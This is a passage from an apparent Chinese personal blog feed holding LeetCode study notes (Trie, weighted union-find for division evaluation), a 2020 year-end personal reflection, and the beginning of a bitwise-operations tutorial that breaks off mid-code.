class="hljs-keyword">void</span> <span class="hljs-title">makeRecently</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> value = cache.get(key);<br>    cache.remove(key);<br>    cache.put(key, value);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-2-实现Tire-前缀树"><a href="#10-2-实现Tire-前缀树" class="headerlink" title="10.2 实现Tire(前缀树)"></a>10.2 实现Tire(前缀树)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Trie</span> </span>&#123;<br><br>    <span class="hljs-keyword">boolean</span> isEnd = <span class="hljs-keyword">false</span>;<br>    Trie[] next = <span class="hljs-keyword">new</span> Trie[<span class="hljs-number">26</span>];<br>    <br><br><br>    <span class="hljs-comment">/** Initialize your data structure here. */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Trie</span><span class="hljs-params">()</span> </span>&#123;<br><br>    &#125;<br>    <br>    <span class="hljs-comment">/** Inserts a word into the trie. */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(String word)</span> </span>&#123;<br>        Trie root = <span class="hljs-keyword">this</span>;<br>        <span class="hljs-keyword">char</span>[] chars = word.toCharArray();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; chars.length; i++)&#123;<br>            <span class="hljs-keyword">if</span>(root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>] == <span class="hljs-keyword">null</span>)&#123;<br>                root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-keyword">new</span> Trie();<br>            &#125;<br>            root = root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>];<br>        &#125;<br>        root.isEnd = <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">/** Returns if the word is in the trie. */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">search</span><span class="hljs-params">(String word)</span> </span>&#123;<br>        Trie root = <span class="hljs-keyword">this</span>;<br>        <span class="hljs-keyword">char</span>[] chars = word.toCharArray();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; chars.length; i++)&#123;<br>            <span class="hljs-keyword">if</span>(root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>] == <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>            root = root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> root.isEnd;<br>    &#125;<br>    <br>    <span class="hljs-comment">/** Returns if there is any word in the trie that starts with the given prefix. */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">startsWith</span><span class="hljs-params">(String prefix)</span> </span>&#123;<br>        Trie root = <span class="hljs-keyword">this</span>;<br>        <span class="hljs-keyword">char</span>[] chars = prefix.toCharArray();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; chars.length; i++)&#123;<br>            <span class="hljs-keyword">if</span>(root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>] == <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>            root = root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="11-并查集"><a href="#11-并查集" class="headerlink" title="11. 并查集"></a>11. 并查集</h1><h2 id="11-1-除法求值"><a href="#11-1-除法求值" class="headerlink" title="11.1 除法求值"></a>11.1 除法求值</h2><p>这个题应该被列为hard，先copy</p><p>​        这道题是在「力扣」第 990 题（等式方程的可满足性）的基础上，在变量和变量之间有了倍数关系。由于变量之间的倍数关系具有传递性，处理有传递性关系的问题，可以使用「并查集」，我们需要在并查集的「合并」与「查询」操作中 维护这些变量之间的倍数关系。</p><p>​        说明：请注意题目中的「注意」和「数据范围」，例如：每个 Ai 或 Bi 是一个表示单个变量的字符串。所以用例 equation = [“ab”, “cd”] ，这里的 ab 视为一个变量，不表示 a * b。如果面试中遇到这样的问题，一定要和面试官确认清楚题目的条件。还有 1 &lt;= equations.length &lt;= 20 和 values[i] &gt; 0.0 可以避免一些特殊情况的讨论。</p><p><strong>方法：并查集</strong></p><p>分析示例 1：</p><p>a / b = 2.0 说明 a = 2b， a 和 b 在同一个集合中；</p><p>b / c = 3.0 说明 b = 3c ，b 和 c 在同一个集合中。</p><p>求 $\cfrac{a}{c}$   ，可以把 a = 2b，b=3c 依次代入，得到 $\cfrac{a}{c} = \cfrac{2b} {c} = \cfrac{2 \cdot 3c} {c} = 6.0$<br>求$\cfrac{b}{a}$，很显然根据 a = 2b，知道 $\cfrac{b}{a} = 0.5$ ，也可以把 b 和 a 都转换成为 c 的倍数，$\cfrac{b}{a} = \cfrac{b} {2b} = \cfrac{3c} {6c} = \cfrac{1}{2} = 0.5 $</p><p>​        我们计算了两个结果，不难知道：可以将题目给出的 equation 中的两个变量所在的集合进行「合并」，同在一个集合中的两个变量就可以通过某种方式计算出它们的比值。具体来说，可以把 不同的变量的比值转换成为相同的变量的比值，这样在做除法的时候就可以消去相同的变量，然后再计算转换成相同变量以后的系数的比值，就是题目要求的结果。统一了比较的标准，可以以 O(1)的时间复杂度完成计算。</p><p>​        如果两个变量不在同一个集合中， 返回 −1.0。并且根据题目的意思，如果两个变量中 至少有一个 变量没有出现在所有 equations 出现的字符集合中，也返回 -1.0。</p><p><strong>构建有向图</strong></p><p>​        通过例 1 的分析，我们就知道了，题目给出的 equations 和 values 可以表示成一个图，equations 中出现的变量就是图的顶点，「分子」于「分母」的比值可以表示成一个有向关系（因为「分子」和「分母」是有序的，不可以对换），并且这个图是一个带权图，values 就是对应的有向边的权值。例 1 中给出的 equations 和 values 表示的「图形表示」、「数学表示」和「代码表示」如下表所示。其中 parent[a] = b 表示：结点 a 的（直接）父亲结点是 b，与之对应的有向边的权重，记为 weight[a] = 2.0，即 weight[a] 表示结点 a 到它的 直接父亲结点 的有向边的权重。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值.png" alt="除法求值" style="zoom:50%;" /></p><p><strong>「统一变量」与「路径压缩」的关系</strong></p><p>​        刚刚在分析例 1 的过程中，提到了：可以把一个一个 query 中的不同变量转换成 同一个变量，这样在计算 query 的时候就可以以 O(1)的时间复杂度计算出结果，在「并查集」的一个优化技巧中，「路径压缩」就恰好符合了这样的应用场景。</p><p>​        为了避免并查集所表示的树形结构高度过高，影响查询性能。「路径压缩」就是针对树的高度的优化。「路径压缩」的效果是：在查询一个结点 a 的根结点同时，把结点 a 到根结点的沿途所有结点的父亲结点都指向根结点。如下图所示，除了根结点以外，所有的结点的父亲结点都指向了根结点。特别地，也可以认为根结点的父亲结点就是根结点自己。如下国所示：路径压缩前后，并查集所表示的两棵树形结构等价，路径压缩以后的树的高度为 2，查询性能最好。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值1.png" alt="除法求值1" style="zoom:50%;" /></p><p>​        由于有「路径压缩」的优化，两个同在一个连通分量中的不同的变量，它们分别到根结点（父亲结点）的权值的比值，就是题目的要求的结果。</p><p><strong>如何在「查询」操作的「路径压缩」优化中维护权值变化</strong></p><p>​    如下图所示，我们在结点 a 执行一次「查询」操作。路径压缩会先一层一层向上先找到根结点 d，然后依次把 c、b 、a 的父亲结点指向根结点 d。</p><ul><li>c 的父亲结点已经是根结点了，它的权值不用更改；</li><li>b 的父亲结点要修改成根结点，它的权值就是从当前结点到根结点经过的所有有向边的权值的乘积，因此是 3.0 乘以 4.0 也就是 12.0；</li><li>a 的父亲结点要修改成根结点，它的权值就是依然是从当前结点到根结点经过的所有有向边的权值的乘积，但是我们 没有必要把这三条有向边的权值乘起来，这是因为 b 到 c，c 到 d 这两条有向边的权值的乘积，我们在把 b 指向 d 的时候已经计算出来了。因此，a 到根结点的权值就等于 b 到根结点 d 的新的权值乘以 a 到 b 的原来的有向边的权值。</li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值2.png" alt="除法求值2" style="zoom: 33%;" /></p><p><strong>如何在「合并」操作中维护权值的变化</strong></p><p>「合并」操作基于这样一个 很重要的前提：我们将要合并的两棵树的高度最多为 2，换句话说两棵树都必需是「路径压缩」以后的效果，两棵树的叶子结点到根结点最多只需要经过一条有向边。</p><p>​    例如已知$ \cfrac{a}{b} = 3.0$ ，$\cfrac{d}{c} = 4.0$  ，又已知 $\cfrac{a}{d} = 6.0$  ，现在合并结点 a 和 d 所在的集合，其实就是把 a 的根结点 b 指向 d 的根结 c，那么如何计算 b 指向 c 的这条有向边的权重呢？</p><p>​    根据 a 经过 b 可以到达 c，a 经过 d 也可以到达 c，因此 两条路径上的有向边的权值的乘积是一定相等的。设 b 到 c 的权值为 x，那么 $3.0 \cdot x = 6.0 \cdot 4.0$ ，得 $x=8.0$。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值3.png" alt="除法求值3" style="zoom: 67%;" /></p><p><strong>一个容易忽略的细节</strong></p><p>​        接下来还有一个小的细节问题：在合并以后，产生了一棵高度为 3 的树，那么我们在执行查询的时候，例如下图展示的绿色结点和黄色结点，绿色结点并不直接指向根结点，在计算这两个变量的比值的时候，计算边的权值的比值得到的结果是不对的。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值4.png" alt="除法求值4" style="zoom:50%;" /></p><p>​        但其实不用担心这个问题，并查集的「查询」操作会执行「路径压缩」，所以真正在计算两个变量的权值的时候，绿色结点已经指向了根结点，和黄色结点的根结点相同。因此可以用它们指向根结点的有向边的权值的比值作为两个变量的比值。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值5.png" alt="除法求值5" style="zoom:50%;" /></p><p>​    我们通过这个细节向大家强调：一边查询一边修改结点指向是并查集的特色。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span>[] calcEquation(List&lt;List&lt;String&gt;&gt; equations, <span class="hljs-keyword">double</span>[] values, List&lt;List&lt;String&gt;&gt; queries) &#123;<br>        <span class="hljs-keyword">int</span> equationsSize = equations.size();<br><br>        UnionFind unionFind = <span class="hljs-keyword">new</span> UnionFind(<span class="hljs-number">2</span> * equationsSize);<br>        <span class="hljs-comment">// 第 1 步：预处理，将变量的值与 id 进行映射，使得并查集的底层使用数组实现，方便编码</span><br>        Map&lt;String, Integer&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;(<span class="hljs-number">2</span> * equationsSize);<br>        <span class="hljs-keyword">int</span> id = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; equationsSize; i++) &#123;<br>            List&lt;String&gt; equation = equations.get(i);<br>            String var1 = equation.get(<span class="hljs-number">0</span>);<br>            String var2 = equation.get(<span class="hljs-number">1</span>);<br><br>            <span class="hljs-keyword">if</span> (!hashMap.containsKey(var1)) &#123;<br>                hashMap.put(var1, id);<br>                id++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!hashMap.containsKey(var2)) &#123;<br>                hashMap.put(var2, id);<br>                id++;<br>            &#125;<br>            unionFind.union(hashMap.get(var1), hashMap.get(var2), values[i]);<br>        &#125;<br><br>        <span class="hljs-comment">// 第 2 步：做查询</span><br>        <span class="hljs-keyword">int</span> queriesSize = queries.size();<br>        <span class="hljs-keyword">double</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">double</span>[queriesSize];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; queriesSize; i++) &#123;<br>            String var1 = queries.get(i).get(<span class="hljs-number">0</span>);<br>            String var2 = queries.get(i).get(<span class="hljs-number">1</span>);<br><br>            Integer id1 = hashMap.get(var1);<br>            Integer id2 = hashMap.get(var2);<br><br>            <span class="hljs-keyword">if</span> (id1 == <span class="hljs-keyword">null</span> || id2 == <span class="hljs-keyword">null</span>) &#123;<br>                res[i] = -<span class="hljs-number">1.0d</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                res[i] = unionFind.isConnected(id1, id2);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnionFind</span> </span>&#123;<br><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] parent;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 指向的父结点的权值</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span>[] weight;<br><br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">UnionFind</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>            <span class="hljs-keyword">this</span>.parent = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>            <span class="hljs-keyword">this</span>.weight = <span class="hljs-keyword">new</span> <span class="hljs-keyword">double</span>[n];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>                parent[i] = i;<br>                weight[i] = <span class="hljs-number">1.0d</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">union</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y, <span class="hljs-keyword">double</span> value)</span> </span>&#123;<br>            <span class="hljs-keyword">int</span> rootX = find(x);<br>            <span class="hljs-keyword">int</span> rootY = find(y);<br>            <span class="hljs-keyword">if</span> (rootX == rootY) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            parent[rootX] = rootY;<br>          <span class="hljs-comment">// 关系式的推导请见「参考代码」下方的示意图</span><br>            weight[rootX] = weight[y] * value / weight[x];<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 路径压缩</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span> x</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@return</span> 根结点的 id</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>            <span class="hljs-keyword">if</span> (x != parent[x]) &#123;<br>                <span class="hljs-keyword">int</span> origin = parent[x];<br>                parent[x] = find(parent[x]);<br>                weight[x] *= weight[origin];<br>            &#125;<br>            <span class="hljs-keyword">return</span> parent[x];<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">isConnected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>            <span class="hljs-keyword">int</span> rootX = find(x);<br>            <span class="hljs-keyword">int</span> rootY = find(y);<br>            <span class="hljs-keyword">if</span> (rootX == rootY) &#123;<br>                <span class="hljs-keyword">return</span> weight[x] / weight[y];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> -<span class="hljs-number">1.0d</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>说明：代码 weight[rootX] = weight[y] * value / weight[x]; 的推导过程，主要需要明白各个变量的含义，由两条路径有向边的权值乘积相等得到相等关系，然后做等价变换即可。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/除法求值6.png" alt="除法求值6" style="zoom:50%;" /></p><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：$O((N + Q)\log A)$<ul><li>构建并查集 $O(N \log A)$ ，这里 N 为输入方程 equations 的长度，每一次执行合并操作的时间复杂度是 $O(\log A)$，这里 A 是 equations 里不同字符的个数；</li><li>查询并查集 $O(Q \log A)$，这里 Q 为查询数组 queries 的长度，每一次查询时执行「路径压缩」的时间复杂度是 $O(\log A)$。</li></ul></li><li>空间复杂度：O(A)：创建字符与 id 的对应关系 hashMap 长度为 A，并查集底层使用的两个数组 parent 和 weight 存储每个变量的连通分量信息，parent 和 weight 的长度均为 A。</li></ul>]]></content>
    
    
    <summary type="html">leetcodeTOP100</summary>
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="TOP100" scheme="http://example.com/tags/TOP100/"/>
    
  </entry>
  
  <entry>
    <title>2020年终总结</title>
    <link href="http://example.com/2021/03/11/2020%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2021/03/11/2020%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-11T11:53:14.000Z</published>
    <updated>2021-03-13T13:51:34.889Z</updated>
    
    <content type="html"><![CDATA[<p>2020年的生活比往年更有意义，发生了很多事。</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>今年我的开发技术应该算是飞跃的一年，大把的空闲时间以及专业的改变让我更能专注于技术的提升。以前的开发能力约等于无，现在的我开发能力虽然可能还是比不过身边的同学，但是已经可以聊的有来有回了。</p><ul><li><p>完善了Java后端的技术栈。</p></li><li><p>leetcode从无到200+，基本是囫囵吞枣的填鸭式做题，不过还是对算法的应用有了点自己的理解，继续努力。</p></li><li>尝试找了实习，虽然最后没找到，但是确实给我指明了一些方向，不至于走了弯路（有一说一字节真的问的我自闭）。</li></ul><h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><p>进入了北邮以后，实验室的老师，学长和同学都很nice，每天晚上奋战到11点觉得很充实。我也开始有意识的开始读一些业余的书，不过买了很多看的很少hh，看完的书大概有：</p><ul><li>如何阅读一本书，不错的工具书，也契合了很多自己一直以来的学习方法。</li><li>非暴力沟通，沟通技巧总结的很好，但是我一直没有有意识的运用。</li><li>黑客与画家，nice！程序是帮助我们思考的画笔</li></ul><p>没看的书还有好多好多，希望2021的我可以勤奋一点。</p><p>进入北邮开始健身了，刚开始健身的时候别人说很难坚持，但是每天和实验室学长一起去健身以后发现这是很有意义并且并不是很难的事，虽然肌肉没有明显的改变，但是力量确实有所增强，实名感谢实验室诸多学长。</p><p>过年买了把吉他，最近一直在沉迷练习，但是还没能连贯的弹出完整的曲子，暂时按下不表。（啥时候能谈了直接发朋友圈，悄悄的惊艳所有人，不谈~~）</p><h1 id="新的一年"><a href="#新的一年" class="headerlink" title="新的一年"></a>新的一年</h1><p>我是个太贪心的人，总想在新的一年完成太多的目标，人毕竟还是要有梦想的。</p><ul><li>提升后端技术，想把github上的miaosha项目fork过来用springcloud做微服务改造。</li><li>暑假找到一个大厂实习</li><li>leetcode400+</li><li>坚持健身（顺带练练腹肌最好）</li><li>看书10本（把我买的一堆书消化消化，君主论，理想国，小狗钱钱，指数资金投资指南，乌合之众，自卑与超越，先列举这些趴）</li><li>多学几首吉他曲（想学的可太多了）</li><li>想看梁博，周杰伦的演唱会~~</li></ul><p>成为更好的自己！</p>]]></content>
    
    
    <summary type="html">迟到的2020总结</summary>
    
    
    
    <category term="生活" scheme="http://example.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="年度总结" scheme="http://example.com/tags/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>位运算</title>
    <link href="http://example.com/2021/03/11/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    <id>http://example.com/2021/03/11/%E4%BD%8D%E8%BF%90%E7%AE%97/</id>
    <published>2021-03-11T11:53:14.000Z</published>
    <updated>2021-03-11T11:54:57.224Z</updated>
    
    <content type="html"><![CDATA[<p>位运算符</p><ul><li><p>&amp; 与运算 两个位都是 1 时，结果才为 1，否则为 0，如  </p><p>1 0 0 1 1  </p></li></ul><p>&amp;     1 1 0 0 1  </p><hr><p>​        1 0 0 0 1 </p><ul><li><p>| 或运算 两个位都是 0 时，结果才为 0，否则为 1，如  </p></li><li><p>1 0 0 1 1  </p><p>|   1 1 0 0 1  </p></li></ul><hr><p>​       1 1 0 1 1 </p><ul><li><p>^ 异或运算，两个位相同则为 0，不同则为 1，如  </p><p>1 0 0 1 1  </p><p> ^  1 1 0 0 1  </p></li></ul><hr><p>​         0 1 0 1 0 </p><ul><li><p>~ 取反运算，0 则变为 1，1 则变为 0，如 </p><p>~   1 0 0 1 1  </p><hr><p>0 1 1 0 0 </p></li><li><p>&lt;&lt; 左移运算，向左进行移位操作，高位丢弃，低位补 0，如</p></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">int</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> <span class="hljs-number">8</span><span class="hljs-string">;</span><br><span class="hljs-string">a</span> <span class="hljs-string">&lt;&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span><br><span class="hljs-string">移位前：0000</span> <span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">1000</span><br><span class="hljs-string">移位后：0000</span> <span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0100 </span><span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><p>>&gt; 右移运算，向右进行移位操作，对无符号数，高位补 0，对于有符号数，高位补符号位，如</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">unsigned</span> <span class="hljs-string">int</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> <span class="hljs-number">8</span><span class="hljs-string">;</span><br><span class="hljs-string">a</span> <span class="hljs-string">&gt;&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span><br><span class="hljs-string">移位前：0000</span> <span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">1000</span><br><span class="hljs-string">移位后：0000</span> <span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0001</span><br><br><span class="hljs-string">int</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> <span class="hljs-number">-8</span><span class="hljs-string">;</span><br><span class="hljs-string">a</span> <span class="hljs-string">&gt;&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span><br><span class="hljs-string">移位前：1111</span> <span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1000</span><br><span class="hljs-string">移位后：1111</span> <span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure><p>常见位运算问题</p><p><strong>1. 位操作实现乘除法</strong></p><ul><li>数 a 向右移一位，相当于将 a 除以 2；数 a 向左移一位，相当于将 a 乘以 2</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span> a = <span class="hljs-number">2</span>;<br><span class="hljs-attribute">a</span> &gt;&gt; <span class="hljs-number">1</span>; ---&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">a</span> &lt;&lt; <span class="hljs-number">1</span>; ---&gt; <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p><strong>2. 位操作交货两数</strong></p><ul><li>位操作交换两数可以不需要第三个临时变量，虽然普通操作也可以做到，但是没有其效率高</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">//普通操作</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> &amp;a, <span 